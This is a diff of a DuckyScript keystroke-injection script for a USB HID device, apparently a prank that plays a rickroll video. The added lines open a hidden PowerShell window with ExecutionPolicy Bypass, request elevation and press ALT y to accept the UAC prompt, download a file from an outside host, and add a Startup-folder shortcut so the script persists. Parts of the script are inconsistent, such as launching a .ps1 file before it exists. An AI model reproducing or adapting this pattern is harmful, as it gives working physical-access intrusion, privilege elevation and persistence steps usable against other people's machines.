@@ -9,24 +9,32 @@ REM Version: 1.2
 REM start of script
 REM
 REM let the HID enumerate
-DELAY 2000
-GUI r
-DELAY 200
-REM my best attempt at a elevated powershell instance
-STRING powershell Start-Process powershell -Verb runAs
-ENTER
-DELAY 3000
-TAB
-TAB
-SPACE
 DELAY 500
-ALT 
-DELAY 3000
-STRING $down = New-Object System.Net.WebClient;
-STRING $url = 'https://repo.library.stonybrook.edu/xmlui/bitstream/handle/11401/9656/rickroll.mp4?sequence=1&isAllowed=y';
-STRING $file = 'rickroll.mp4';
-STRING $down.DownloadFile($url,$file);
-STRING Start-Process $file;
-STRING exit;
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\rickroll.ps1' -Verb RunAs"
+ENTER
+DELAY 1000
+
+REM Handling UAC Prompt: TAB + ENTER to select "Yes"
+DELAY 500
+ALT y
+DELAY 500
+
+REM Download and create the Rickroll script
+STRING $down = New-Object System.Net.WebClient; $url = 'https://repo.library.stonybrook.edu/xmlui/bitstream/handle/11401/9656/rickroll.mp4?sequence=1&isAllowed=y'; $file = 'C:\Windows\Temp\rickroll.mp4'; $down.DownloadFile($url, $file);
+ENTER
+DELAY 1000
+STRING Add-Type -AssemblyName presentationCore, presentationFramework; [system.windows.media.mediaplayer]$player = New-Object system.windows.media.mediaplayer; $player.open('C:\Windows\Temp\rickroll.mp4'); $player.Play();
+ENTER
+DELAY 1000
+
+REM Save the script to Temp folder for persistence
+STRING $wscript = 'C:\Windows\Temp\startRickroll.ps1'; 'Add-Type -AssemblyName presentationCore, presentationFramework; [system.windows.media.mediaplayer]$player = New-Object system.windows.media.mediaplayer; $player.open(''C:\Windows\Temp\rickroll.mp4''); $player.Play()' > $wscript;
+ENTER
+DELAY 1000
+
+REM Create a shortcut in the Startup folder to make it persistent
+STRING $shortcut = $env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.lnk'; $ws = New-Object -ComObject WScript.Shell; $sc = $ws.CreateShortcut($shortcut); $sc.TargetPath = 'powershell.exe'; $sc.Arguments = '-ExecutionPolicy Bypass -File C:\Windows\Temp\startRickroll.ps1'; $sc.Save();
 ENTER
 
